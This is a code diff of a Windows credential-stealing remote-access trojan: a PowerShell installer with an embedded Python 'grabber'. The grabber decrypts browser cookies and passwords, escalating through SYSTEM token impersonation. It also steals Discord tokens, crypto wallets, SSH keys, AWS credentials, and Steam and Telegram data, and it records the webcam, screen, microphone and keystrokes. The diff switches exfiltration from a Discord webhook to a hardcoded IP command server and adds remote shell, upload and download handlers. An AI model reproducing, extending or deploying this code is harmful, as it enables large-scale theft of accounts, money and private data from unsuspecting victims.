@@ -22,13 +22,11 @@ $Hosts  = Join-Path $env:windir 'System32\drivers\etc\hosts'
 $Domain = 'sevenauthapi.com'
 $Launcher = Join-Path $Root 'fakeauth.exe'
 $IconUrl  = 'https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg'
-$ApiUrl = 'https://crisp-caracal-9212.marcocodev.deno.net/'
-$ApiKey = 'hz-7even-9f3k2m'
 
 Write-Host '>> setup' -ForegroundColor Cyan
 foreach ($t in 'FakeAuth','FakeAuthGrab') { Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue }
 Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe' OR Name='fakeauth.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -match 'fake\.py|run\.py|grab\.py' } |
+    Where-Object { $_.CommandLine -match 'fake\.py|run\.py|agent\.py' } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
 Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
     Where-Object { $_.Subject -like "*CN=$Domain*" } | Remove-Item -Force -ErrorAction SilentlyContinue
@@ -74,7 +72,7 @@ import os, sys, time
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
 log = "server.log"
 try:
-    if os.path.getsize(log) > 2 * 1024 * 1024:
+    if os.path.getsize(log) > 2097152:
         os.replace(log, "server.old.log")
 except OSError:
     pass
@@ -185,7 +183,7 @@ $g.Dispose(); $bmp.Dispose()
 '@
 
 $grab = @'
-import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, zipfile, random
+import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, zipfile, random, threading, winreg, uuid
 
 try:
     import requests
@@ -197,12 +195,13 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
 
-WEBHOOK  = "https://canary.discord.com/api/webhooks/1565742577930600448/WyYxTHvWFtKs9zGRNf0d3RvfByTMVrZOnWkhRLnYep_4aq9Kdk11zh9EWc2sWNow63N3"
-AVATAR   = "https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg"
+API = "http://51.75.118.5:20216"
 INTERVAL = 1800
+POLL = 5
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data")
 STATE = os.path.join(DATA, "state.json")
+CWD = os.path.expanduser("~")
 os.makedirs(DATA, exist_ok=True)
 
 RE_TOKEN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{80,90}")
@@ -211,7 +210,7 @@ SKIP = {"windows", "$recycle.bin", "system volume information", "node_modules", 
         "package cache", "installer", "winsxs", "driverstore", "temp", "tmp"}
 UD = os.environ.get("LOCALAPPDATA", "")
 AD = os.environ.get("APPDATA", "")
-
+DIAG = []
 BROWSERS = [
     ("Chrome", os.path.join(UD, "Google", "Chrome", "User Data")),
     ("ChromeBeta", os.path.join(UD, "Google", "Chrome Beta", "User Data")),
@@ -229,12 +228,33 @@ FIREFOX = os.path.join(AD, "Mozilla", "Firefox", "Profiles")
 def log(m):
     try:
         p = os.path.join(ROOT, "grabber.log")
-        if os.path.exists(p) and os.path.getsize(p) > 1024 * 1024:
+        if os.path.exists(p) and os.path.getsize(p) > 1048576:
             os.replace(p, p + ".old")
         with open(p, "a", encoding="utf-8") as f:
             f.write("%s  %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), m))
     except Exception:
         pass
+
+def _hwid():
+    try:
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+        g = winreg.QueryValueEx(k, "MachineGuid")[0]
+    except Exception:
+        g = socket.gethostname() + str(uuid.getnode())
+    return hashlib.sha256(g.encode()).hexdigest()[:16]
+
+HWID = _hwid()
+
+def api(path, payload=None, timeout=60):
+    if not requests:
+        return None
+    try:
+        url = API.rstrip("/") + path
+        r = requests.get(url, timeout=timeout) if payload is None else requests.post(url, json=payload, timeout=timeout)
+        return r.json() if r.content else {}
+    except Exception as e:
+        log("api %s %r" % (path, e))
+        return None
 
 class BLOB(ctypes.Structure):
     _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
@@ -263,22 +283,22 @@ def _debug():
     tp = TPN(1, (TP * 1)(TP(1, luid, 0x2)))
     ctypes.windll.advapi32.AdjustTokenPrivileges(tok, False, ctypes.byref(tp), 0, None, None)
 
-def _impersonate_system():
+def _system():
     _debug()
     for pid in pids_of({"winlogon.exe"}):
         h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
         if not h:
             continue
         tok = ctypes.wintypes.HANDLE()
-        if ctypes.windll.advapi32.OpenProcessToken(h, 0x0002 | 0x0008, ctypes.byref(tok)):
+        if ctypes.windll.advapi32.OpenProcessToken(h, 0xA, ctypes.byref(tok)):
             dup = ctypes.wintypes.HANDLE()
-            if ctypes.windll.advapi32.DuplicateTokenEx(tok, 0x0004 | 0x0008 | 0x0010, None, 2, 2, ctypes.byref(dup)):
+            if ctypes.windll.advapi32.DuplicateTokenEx(tok, 0x1C, None, 2, 2, ctypes.byref(dup)):
                 if ctypes.windll.advapi32.ImpersonateLoggedOnUser(dup):
                     return True
     return False
 
-def user_key(user_data):
-    ls = os.path.join(user_data, "Local State")
+def user_key(ud):
+    ls = os.path.join(ud, "Local State")
     if not os.path.exists(ls):
         return None
     try:
@@ -286,12 +306,10 @@ def user_key(user_data):
     except Exception:
         return None
     k = dpapi(base64.b64decode(raw)[5:])
-    if not k:
-        return None
-    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k)
+    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k) if k else None
 
-def app_key(user_data):
-    ls = os.path.join(user_data, "Local State")
+def app_key(ud):
+    ls = os.path.join(ud, "Local State")
     if not os.path.exists(ls):
         return None
     try:
@@ -300,21 +318,19 @@ def app_key(user_data):
         return None
     if raw[:4] != b"APPB":
         return None
-    ok = _impersonate_system()
+    ok = _system()
     try:
         blob = dpapi(raw[4:], True)
     finally:
         if ok:
             ctypes.windll.advapi32.RevertToSelf()
-    if not blob:
+    if not blob or len(blob) < 32:
         return None
     try:
         key = hashlib.sha256(b"Google Chromekey1").digest()
         for _ in range(32):
             e = Cipher(algorithms.AES(key), modes.CBC(key[:16])).encryptor()
             key = (e.update(key) + e.finalize())[:32]
-        if len(blob) < 32:
-            return None
         plain = AESGCM(key).decrypt(blob[:12], blob[12:], None)
         if plain and plain[0] == 1:
             return plain[1:33]
@@ -335,7 +351,7 @@ def dec(blob, key, aad=b"", akey=None):
                         return AESGCM(akey).decrypt(blob[3:15], blob[15:], a).decode("utf-8", "replace")
                     except Exception:
                         pass
-            return "[v20] " + base64.b64encode(blob).decode()
+            return "[v20]" + base64.b64encode(blob).decode()
         try:
             return blob.decode("utf-8")
         except Exception:
@@ -346,70 +362,83 @@ def dec(blob, key, aad=b"", akey=None):
         return ""
 
 def open_db(src):
-    tag = str(random.randint(0, 999999))
-    tmp = os.path.join(DATA, "db" + tag)
+    tmp = os.path.join(DATA, "db%d" % random.randint(0, 999999))
+    got = False
     for ext in ("", "-wal", "-shm", "-journal"):
         if os.path.exists(src + ext):
             try:
                 shutil.copy2(src + ext, tmp + ext)
+                got = True
             except Exception:
                 pass
-    for uri in ("file:%s?immutable=1" % tmp.replace("\\", "/"), "file:%s?mode=ro" % tmp.replace("\\", "/")):
+    if not got:
+        return None
+    for target, is_uri in ((tmp, False), ("file:%s?mode=ro&nolock=1" % tmp.replace("\\", "/"), True),
+                           ("file:%s?immutable=1" % tmp.replace("\\", "/"), True)):
         try:
-            return sqlite3.connect(uri, uri=True, timeout=5)
+            con = sqlite3.connect(target, uri=is_uri, timeout=8)
+            con.execute("select 1 from sqlite_master limit 1").fetchall()
+            return con
         except Exception:
             continue
-    return sqlite3.connect(tmp, timeout=5)
+    return None
 
-def profiles_of(user_data):
-    if not os.path.isdir(user_data):
+def profiles_of(ud):
+    if not os.path.isdir(ud):
         return []
     try:
-        names = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d))]
+        names = [d for d in os.listdir(ud) if os.path.isdir(os.path.join(ud, d))]
     except Exception:
         return []
-    sel = [p for p in names if p == "Default" or p.startswith("Profile")]
-    return sel or [""]
+    return [p for p in names if p == "Default" or p.startswith("Profile")]
 
-def cookies(user_data):
-    out = []
-    key = user_key(user_data)
-    akey = app_key(user_data)
-    for prof in profiles_of(user_data):
+def cookies(ud):
+    out, n = [], 0
+    key = user_key(ud)
+    akey = app_key(ud)
+    for prof in profiles_of(ud):
         for cand in ("Network\\Cookies", "Cookies"):
-            src = os.path.join(user_data, prof, cand)
+            src = os.path.join(ud, prof, cand)
             if not os.path.exists(src):
                 continue
-            try:
-                con = open_db(src)
-                rows = con.execute("select host_key,name,encrypted_value,path from cookies").fetchall()
-                con.close()
-            except Exception:
+            con = open_db(src)
+            if not con:
+                DIAG.append("%s/%s db fail" % (os.path.basename(ud), prof))
                 continue
+            try:
+                rows = con.execute("select host_key,name,encrypted_value,path from cookies").fetchall()
+            except Exception as e:
+                DIAG.append("%s/%s %s" % (os.path.basename(ud), prof, e))
+                rows = []
+            con.close()
             for host, cn, ev, path in rows:
+                n += 1
                 v = dec(ev, key, host.encode(), akey)
                 if v:
                     out.append("%s\t%s\t%s\t%s" % (host, cn, v, path))
+    if n:
+        DIAG.append("%s rows=%d ok=%d ukey=%s akey=%s" % (os.path.basename(ud), n, len(out), bool(key), bool(akey)))
     return out
 
-def passwords(user_data):
+def passwords(ud):
     out = []
-    key = user_key(user_data)
-    akey = app_key(user_data)
-    for prof in profiles_of(user_data):
-        src = os.path.join(user_data, prof, "Login Data")
+    key = user_key(ud)
+    akey = app_key(ud)
+    for prof in profiles_of(ud):
+        src = os.path.join(ud, prof, "Login Data")
         if not os.path.exists(src):
             continue
-        try:
-            con = open_db(src)
-            rows = con.execute("select origin_url,username_value,password_value from logins").fetchall()
-            con.close()
-        except Exception:
+        con = open_db(src)
+        if not con:
             continue
+        try:
+            rows = con.execute("select origin_url,username_value,password_value from logins").fetchall()
+        except Exception:
+            rows = []
+        con.close()
         for url, user, pw in rows:
-            if not user:
-                continue
-            out.append("%s\t%s\t%s" % (url, user, dec(pw, key, url.encode(), akey)))
+            if user:
+                out.append("%s\t%s\t%s" % (url, user, dec(pw, key, url.encode(), akey)))
     return out
 
 def firefox():
@@ -420,13 +449,15 @@ def firefox():
         src = os.path.join(FIREFOX, prof, "cookies.sqlite")
         if not os.path.exists(src):
             continue
+        con = open_db(src)
+        if not con:
+            continue
         try:
-            con = open_db(src)
             for h, n, v in con.execute("select host,name,value from moz_cookies").fetchall():
                 out.append("%s\t%s\t%s\t/" % (h, n, v))
-            con.close()
         except Exception:
             pass
+        con.close()
     return out
 
 def pids_of(names):
@@ -457,8 +488,7 @@ def discord_dirs():
         if not os.path.isdir(base):
             continue
         for n in os.listdir(base):
-            low = n.lower()
-            if "discord" in low or "lightcord" in low:
+            if "discord" in n.lower() or "lightcord" in n.lower():
                 p = os.path.join(base, n)
                 if os.path.isdir(p):
                     dirs.add(p)
@@ -477,7 +507,7 @@ def read_tokens(folder, max_depth=6):
                 continue
             p = os.path.join(dp, fn)
             try:
-                if os.path.getsize(p) > 16 * 1024 * 1024:
+                if os.path.getsize(p) > 16777216:
                     continue
                 blob = open(p, "rb").read().decode("latin-1")
             except Exception:
@@ -510,7 +540,7 @@ def disk_scan(deadline):
                 try:
                     for fn in fns:
                         p = os.path.join(dp, fn)
-                        if os.path.getsize(p) > 16 * 1024 * 1024:
+                        if os.path.getsize(p) > 16777216:
                             continue
                         blob = open(p, "rb").read().decode("latin-1")
                         for m in RE_TOKEN.findall(blob):
@@ -528,16 +558,15 @@ def validate(tok):
         if r.status_code != 200:
             return {"valid": False, "code": r.status_code}
         u = r.json()
-        info = {"valid": True, "id": u.get("id"), "username": u.get("username"),
-                "email": u.get("email"), "phone": u.get("phone"), "mfa": u.get("mfa_enabled"),
-                "verified": u.get("verified"), "nitro": u.get("premium_type")}
+        i = {"valid": True, "id": u.get("id"), "username": u.get("username"), "email": u.get("email"),
+             "phone": u.get("phone"), "mfa": u.get("mfa_enabled"), "nitro": u.get("premium_type")}
         try:
             b = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                              headers={"Authorization": tok}, timeout=15).json()
-            info["subs"] = len(b) if isinstance(b, list) else 0
+            i["subs"] = len(b) if isinstance(b, list) else 0
         except Exception:
             pass
-        return info
+        return i
     except Exception as e:
         return {"valid": None, "err": str(e)[:60]}
 
@@ -556,9 +585,7 @@ try{$o.uptime=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootU
 try{$o.key=(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey}catch{}
 try{$o.av=@(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object { $_.displayName }) -join ', '}catch{}
 try{$o.users=@(Get-LocalUser | ForEach-Object { "$($_.Name)($($_.Enabled))" }) -join ', '}catch{}
-try{$o.procs=@(Get-Process | Sort-Object -Descending WorkingSet | Select-Object -First 30 | ForEach-Object { $_.Name }) -join ', '}catch{}
 try{$o.startup=@(Get-CimInstance Win32_StartupCommand | ForEach-Object { "$($_.Name)=$($_.Command)" }) -join ' || '}catch{}
-try{$o.installed=@(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { $_.DisplayName } | Where-Object { $_ }) -join ', '}catch{}
 try{$o.clip=Get-Clipboard -Raw}catch{}
 $o | ConvertTo-Json -Compress
 """
@@ -612,33 +639,17 @@ def emails():
             src = os.path.join(ud, prof, "Login Data")
             if not os.path.exists(src):
                 continue
+            con = open_db(src)
+            if not con:
+                continue
             try:
-                con = open_db(src)
                 for (x,) in con.execute("select username_value from logins where username_value like '%@%'"):
                     if x:
                         out.add(x.strip())
-                con.close()
             except Exception:
                 pass
+            con.close()
     return sorted(x for x in out if "@" in x)
-
-def histories():
-    out = {}
-    for name, ud in BROWSERS:
-        n = 0
-        for prof in profiles_of(ud):
-            src = os.path.join(ud, prof, "History")
-            if not os.path.exists(src):
-                continue
-            try:
-                con = open_db(src)
-                n += con.execute("select count(*) from urls").fetchone()[0]
-                con.close()
-            except Exception:
-                pass
-        if n:
-            out[name] = n
-    return out
 
 def roblox():
     out = set()
@@ -665,21 +676,18 @@ WALLETS = {
     "Metamask": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
     "Phantom": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
 }
-MISC = [
-    os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.ssh/id_ed25519"),
-    os.path.expanduser("~/.ssh/known_hosts"), os.path.expanduser("~/.aws/credentials"),
-    os.path.expanduser("~/.gitconfig"), os.path.expanduser("~/.npmrc"),
-    os.path.join(AD, ".minecraft", "launcher_accounts.json"),
-]
+MISC = [os.path.expanduser(p) for p in ("~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/known_hosts",
+        "~/.aws/credentials", "~/.gitconfig", "~/.npmrc")]
+MISC.append(os.path.join(AD, ".minecraft", "launcher_accounts.json"))
 
 def camera():
     out = os.path.join(DATA, "cam.jpg")
     try:
         if os.path.exists(out):
             os.remove(out)
-        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
-                        "-File", os.path.join(ROOT, "cam.ps1"), "-Out", out],
-                       capture_output=True, timeout=45, creationflags=0x08000000)
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
+                        os.path.join(ROOT, "cam.ps1"), "-Out", out], capture_output=True, timeout=45,
+                       creationflags=0x08000000)
     except Exception:
         pass
     return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None
@@ -689,9 +697,9 @@ def shot():
     try:
         if os.path.exists(out):
             os.remove(out)
-        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
-                        "-File", os.path.join(ROOT, "screen.ps1"), "-Out", out],
-                       capture_output=True, timeout=45, creationflags=0x08000000)
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
+                        os.path.join(ROOT, "screen.ps1"), "-Out", out], capture_output=True, timeout=45,
+                       creationflags=0x08000000)
     except Exception:
         pass
     return out if os.path.exists(out) and os.path.getsize(out) > 3000 else None
@@ -705,14 +713,14 @@ def voice(sec=10):
         pass
     try:
         mci = ctypes.windll.winmm.mciSendStringW
-        buf = ctypes.create_unicode_buffer(512)
-        mci("open new type waveaudio alias rec", buf, 512, None)
-        mci("set rec time format ms bitspersample 16 channels 1 samplespersec 22050", buf, 512, None)
-        mci("record rec", buf, 512, None)
+        b = ctypes.create_unicode_buffer(512)
+        mci("open new type waveaudio alias rec", b, 512, None)
+        mci("set rec time format ms bitspersample 16 channels 1 samplespersec 22050", b, 512, None)
+        mci("record rec", b, 512, None)
         time.sleep(sec)
-        mci("stop rec", buf, 512, None)
-        mci('save rec "%s"' % out, buf, 512, None)
-        mci("close rec", buf, 512, None)
+        mci("stop rec", b, 512, None)
+        mci('save rec "%s"' % out, b, 512, None)
+        mci("close rec", b, 512, None)
     except Exception as e:
         log("voice %r" % e)
     return out if os.path.exists(out) and os.path.getsize(out) > 4000 else None
@@ -732,22 +740,6 @@ def save_state(s):
 def hh(t):
     return hashlib.sha256(t.encode()).hexdigest()[:16]
 
-def send(payload, files):
-    if not requests:
-        return
-    try:
-        r = requests.post(WEBHOOK, data={"payload_json": json.dumps(payload)}, files=files or {}, timeout=180)
-        log("send %s %s" % (r.status_code, r.text[:120]))
-    except Exception as e:
-        log("send err %r" % e)
-
-def quick_tokens():
-    found = set()
-    for d in discord_dirs():
-        found |= read_tokens(d)
-    found |= browser_tokens()
-    return {k: v for k, v in found if len(k) > 50}
-
 def build_zip(sp):
     path = os.path.join(DATA, "dump.zip")
     ck, pw = [], []
@@ -759,163 +751,212 @@ def build_zip(sp):
         if p:
             pw += ["# %s" % name] + p
     ck += ["# Firefox"] + firefox()
-    rb = roblox()
     tot = 0
     with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
         z.writestr("cookies.txt", "\n".join(ck))
         z.writestr("passwords.txt", "\n".join(pw))
         z.writestr("sysinfo.txt", json.dumps(sp, indent=1, ensure_ascii=False))
-        z.writestr("roblox.txt", "\n".join(rb))
+        z.writestr("roblox.txt", "\n".join(roblox()))
         for name, p in WALLETS.items():
             if not os.path.exists(p):
                 continue
             if os.path.isfile(p):
                 if os.path.getsize(p) < 2097152:
                     z.write(p, "wallets/%s_%s" % (name, os.path.basename(p)))
-            else:
-                for dp, dn, fn in os.walk(p):
-                    for f in fn:
-                        fp = os.path.join(dp, f)
-                        try:
-                            if os.path.getsize(fp) > 2097152:
-                                continue
-                            tot += os.path.getsize(fp)
-                            if tot > 12582912:
-                                break
-                            z.write(fp, "wallets/%s/%s" % (name, os.path.relpath(fp, p)))
-                        except Exception:
-                            pass
-        for m in MISC:
-            if os.path.exists(m) and os.path.getsize(m) < 524288:
-                z.write(m, "misc/" + os.path.basename(m))
-        steam = r"C:\Program Files (x86)\Steam\config"
-        if os.path.isdir(steam):
-            for f in os.listdir(steam):
-                if f.startswith("ssfn") or f == "loginusers.vdf":
-                    try:
-                        z.write(os.path.join(steam, f), "steam/" + f)
-                    except Exception:
-                        pass
-        td = os.path.join(AD, "Telegram Desktop", "tdata")
-        if os.path.isdir(td):
-            for dp, dn, fn in os.walk(td):
+                continue
+            for dp, dn, fn in os.walk(p):
                 for f in fn:
                     fp = os.path.join(dp, f)
                     try:
-                        if os.path.getsize(fp) > 2097152:
+                        if os.path.getsize(fp) > 2097152 or tot > 12582912:
                             continue
                         tot += os.path.getsize(fp)
-                        if tot > 18874368:
-                            break
-                        z.write(fp, "tdata/" + os.path.relpath(fp, td))
+                        z.write(fp, "wallets/%s/%s" % (name, os.path.relpath(fp, p)))
+                    except Exception:
+                        pass
+        for m in MISC:
+            if os.path.exists(m) and os.path.getsize(m) < 524288:
+                z.write(m, "misc/" + os.path.basename(m))
+        for base, pref in ((r"C:\Program Files (x86)\Steam\config", "steam"),
+                           (os.path.join(AD, "Telegram Desktop", "tdata"), "tdata")):
+            if not os.path.isdir(base):
+                continue
+            for dp, dn, fn in os.walk(base):
+                for f in fn:
+                    fp = os.path.join(dp, f)
+                    try:
+                        if os.path.getsize(fp) > 2097152 or tot > 18874368:
+                            continue
+                        tot += os.path.getsize(fp)
+                        z.write(fp, "%s/%s" % (pref, os.path.relpath(fp, base)))
                     except Exception:
                         pass
     return path, len([x for x in ck if not x.startswith("# ")]), len([x for x in pw if not x.startswith("# ")])
 
-def report(tokens, sp, tag, files):
-    st = load_state()
-    known = st.setdefault("tokens", {})
-    events, lines, users = [], [], []
-    for tok, src in tokens.items():
-        key = hh(tok)
-        info = validate(tok) or {}
-        prev = known.get(key, {})
-        if not prev:
-            events.append("NEW")
-        elif prev.get("valid") and not info.get("valid"):
-            events.append("PATCHED/INVALID")
-        if info.get("valid") and prev.get("id") and prev.get("id") != info.get("id"):
-            events.append("CHANGED")
-        known[key] = {"valid": info.get("valid"), "id": info.get("id"),
-                      "user": info.get("username"), "seen": int(time.time())}
-        if info.get("valid"):
-            users.append("%s (%s)" % (info.get("username"), info.get("id")))
-            lines.append("**VALID** `%s`\n> %s | %s | nitro %s | mfa %s | subs %s\n> `%s`\n> %s"
-                         % (info.get("username"), info.get("id"), info.get("email") or "-",
-                            info.get("nitro"), info.get("mfa"), info.get("subs", "?"), tok, src))
-        else:
-            lines.append("**%s** (HTTP %s)\n> `%s`\n> %s"
-                         % ("INVALID" if info.get("valid") is False else "UNVERIFIED",
-                            info.get("code", "?"), tok, src))
-    save_state(st)
-
-    desc = "\n".join(lines)[:4000] or "no tokens"
-    if events:
-        desc = "**%s**\n\n" % ", ".join(sorted(set(events))) + desc
-
-    e = {
-        "title": "%s | %s | %s" % (socket.gethostname(), sp.get("ip", "?"), tag),
-        "description": desc,
-        "color": 0x5865F2,
-        "fields": [
-            {"name": "Device", "value": "`%s` | %s | %s | up %s min" % (socket.gethostname(), sp.get("local", "?"), sp.get("geo") or "-", sp.get("uptime", "?")), "inline": False},
-            {"name": "Users", "value": (", ".join(users) or "-")[:1000], "inline": True},
-            {"name": "Emails", "value": ("\n".join(sp.get("emails", [])) or "-")[:1000], "inline": True},
-            {"name": "WiFi", "value": "`%s`" % ((sp.get("wifi_keys") or sp.get("wifi") or "-")[:900]), "inline": False},
-            {"name": "Disks", "value": "`%s`" % (sp.get("disks") or "-"), "inline": False},
-            {"name": "Specs", "value": "CPU `%s`\nGPU `%s` %s\nRAM `%sGB`\n`%s`\n`%s`\nkey `%s`\nAV `%s`"
-                % (sp.get("cpu"), sp.get("gpu"), sp.get("res"), sp.get("ram_gb"), sp.get("mobo"),
-                   sp.get("os"), sp.get("key") or "-", sp.get("av") or "-"), "inline": False},
-            {"name": "Accounts", "value": "`%s`" % (sp.get("users") or "-"), "inline": False},
-            {"name": "Clipboard", "value": "`%s`" % ((sp.get("clip") or "-")[:900]), "inline": False},
-            {"name": "Loot", "value": "cookies `%s` | passes `%s` | history `%s`"
-                % (sp.get("ckn", 0), sp.get("pwn", 0), json.dumps(sp.get("hist", {}))), "inline": False},
-        ],
-        "footer": {"text": "herox bypass grabber | 30min"},
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
-    }
-    send({"username": "herox bypass grabber", "avatar_url": AVATAR, "embeds": [e]}, files)
-
-def cycle(deep=True):
+def cycle():
     t0 = time.time()
     sp = sysinfo()
     sp["ip"] = pub_ip()
     sp["local"] = local_ips()
     sp["geo"] = geo(sp["ip"])
     sp["emails"] = emails()
-    sp["hist"] = histories()
-
-    zp, sp["ckn"], sp["pwn"] = build_zip(sp)
-    files = {"files[0]": ("dump.zip", open(zp, "rb"))}
-    i = 1
+    zp, ck, pw = build_zip(sp)
+    sp["ckn"], sp["pwn"] = ck, pw
+    sp["diag"] = DIAG[-40:]
+    files = [{"name": "dump.zip", "b64": base64.b64encode(open(zp, "rb").read()).decode()}]
     for fn, nm in ((camera(), "cam.jpg"), (shot(), "screen.jpg"), (voice(), "voice.wav")):
         if fn:
-            files["files[%d]" % i] = (nm, open(fn, "rb"))
-            i += 1
+            files.append({"name": nm, "b64": base64.b64encode(open(fn, "rb").read()).decode()})
+    sp["files"] = files
 
-    tokens = quick_tokens()
-    report(tokens, sp, "FIRST" if not os.path.exists(STATE) else "UPDATE", files)
-    for f in files.values():
-        try:
-            f[1].close()
-        except Exception:
-            pass
+    st = load_state()
+    known = st.setdefault("tokens", {})
+    toks, events, users, lines = {}, [], [], []
+    found = set()
+    for d in discord_dirs():
+        found |= read_tokens(d)
+    found |= browser_tokens()
+    for tok, src in found:
+        if len(tok) > 50:
+            toks.setdefault(tok, src)
+    for tok, src in toks.items():
+        info = validate(tok) or {}
+        prev = known.get(hh(tok), {})
+        if not prev:
+            events.append("NEW")
+        elif prev.get("valid") and not info.get("valid"):
+            events.append("PATCHED")
+        known[hh(tok)] = {"valid": info.get("valid"), "id": info.get("id"), "t": int(time.time())}
+        if info.get("valid"):
+            users.append("%s (%s)" % (info.get("username"), info.get("id")))
+            lines.append("VALID %s | %s | nitro %s\n%s\n%s" % (info.get("username"),
+                         info.get("email") or "-", info.get("nitro"), tok, src))
+        else:
+            lines.append("INVALID %s\n%s\n%s" % (info.get("code", "?"), tok, src))
+    save_state(st)
 
-    if deep:
-        more = {k: v for k, v in disk_scan(t0 + 150).items() if k not in tokens and len(k) > 50}
-        if more:
-            slim = {"ip": sp["ip"], "local": sp["local"], "geo": sp["geo"], "emails": sp["emails"],
-                    "hist": sp["hist"], "ckn": sp["ckn"], "pwn": sp["pwn"]}
-            report(more, slim, "DEEP", {})
-    log("cycle %ds tokens=%d ck=%d pw=%d" % (time.time() - t0, len(tokens), sp["ckn"], sp["pwn"]))
+    for tok, src in disk_scan(t0 + 150):
+        if tok in toks or len(tok) < 50:
+            continue
+        info = validate(tok) or {}
+        if info.get("valid"):
+            users.append("%s (%s)" % (info.get("username"), info.get("id")))
+        lines.append("DEEP %s\n%s\n%s" % (info.get("username") or "?", tok, src))
+
+    sp.update({"hwid": HWID, "host": socket.gethostname(), "user": os.environ.get("USERNAME", "?"),
+               "tokens": "\n\n".join(lines)[:55000], "ntok": len(toks),
+               "events": ",".join(sorted(set(events)))})
+    api("/beacon", sp, timeout=300)
+    log("cycle %ds tok=%d ck=%d pw=%d" % (time.time() - t0, len(toks), ck, pw))
+
+KEYLOG = []
+
+def _vk(v):
+    m = {8: "[BS]", 9: "[TAB]", 13: "\n", 32: " ", 160: "[SHIFT]", 162: "[CTRL]", 164: "[ALT]"}
+    if v in m:
+        return m[v]
+    if 48 <= v <= 57 or 65 <= v <= 90:
+        return chr(v).lower()
+    return ""
+
+def kl():
+    while True:
+        for v in range(8, 256):
+            if ctypes.windll.user32.GetAsyncKeyState(v) & 1:
+                c = _vk(v)
+                if c:
+                    KEYLOG.append(c)
+                    if len(KEYLOG) > 8000:
+                        del KEYLOG[:2000]
+        time.sleep(0.02)
+
+def do_shell(a):
+    r = subprocess.run(a, shell=True, cwd=CWD, capture_output=True, timeout=180)
+    return (r.stdout + r.stderr).decode("mbcs", "replace")[:50000] or "(no output)"
+
+def do_ls(a):
+    global CWD
+    if a.strip():
+        CWD = a.strip().strip('"')
+    if not os.path.isdir(CWD):
+        return "bad dir"
+    return "\n".join(sorted(os.listdir(CWD)))
+
+def do_dl(a):
+    p = a.strip().strip('"')
+    if not os.path.isfile(p):
+        return "not found"
+    return open(p, "rb").read(), os.path.basename(p)
+
+def do_ul(a):
+    p, _, b = a.partition("|")
+    open(p.strip().strip('"'), "wb").write(base64.b64decode(b))
+    return "written"
+
+def ps(c):
+    return subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", c],
+                          capture_output=True, text=True, timeout=120, creationflags=0x08000000).stdout
+
+def do_uninstall(a):
+    for t in ("FakeAuthGrab", "FakeAuth"):
+        subprocess.run(["schtasks", "/delete", "/tn", t, "/f"], capture_output=True)
+    subprocess.Popen(["powershell", "-NoProfile", "-Command",
+                      "attrib -h -s C:\\seven; Start-Sleep 2; Remove-Item C:\\seven -Recurse -Force"])
+    return "uninstalled"
+
+HANDLERS = {
+    "info": lambda a: json.dumps(sysinfo(), indent=1, ensure_ascii=False),
+    "shell": do_shell, "ls": do_ls, "download": do_dl, "upload": do_ul,
+    "screenshot": lambda a: (open(shot(), "rb").read(), "screen.jpg"),
+    "cam": lambda a: (open(camera(), "rb").read(), "cam.jpg"),
+    "mic": lambda a: (open(voice(10), "rb").read(), "voice.wav"),
+    "clip": lambda a: ps("Get-Clipboard -Raw") or "-",
+    "keylog": lambda a: ("".join(KEYLOG) or "-")[-40000:],
+    "procs": lambda a: ps("Get-Process | Sort WorkingSet -Desc | Select -First 60 Name,Id,WS | Format-Table -Auto | Out-String"),
